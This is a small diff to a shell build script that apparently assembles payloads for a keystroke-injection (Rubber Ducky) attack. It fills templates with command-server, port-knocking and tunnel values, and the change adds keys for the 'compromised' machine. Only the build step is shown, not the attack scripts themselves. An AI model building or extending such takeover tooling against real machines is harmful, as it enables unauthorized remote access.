@@ -13,7 +13,7 @@ fi
 mkdir payload
 
 envsubst "\$C_SERVER \$PAYLOAD_PATH \$KNOCK_OPEN_HTTP \$KNOCK_OPEN_HTTPS" < ducky/ducky_script.txt > payload/ducky.txt
-envsubst "\$KNOCK_OPEN_TUNNEL \$C_SERVER \$SERVER_TUNNEL_PORT \$SERVER_IP \$SERVER_PUBLIC_KEY" < ducky/script.sh > payload/payload.sh
+envsubst "\$KNOCK_OPEN_TUNNEL \$C_SERVER \$SERVER_TUNNEL_PORT \$SERVER_IP \$SERVER_PUBLIC_KEY \$COMPROMISED_PUBLIC_KEY \$COMPROMISED_PRIVATE_KEY" < ducky/script.sh > payload/payload.sh
 envsubst < setup_takeover/setup_knock.bash > payload/server_payload.sh
 
 
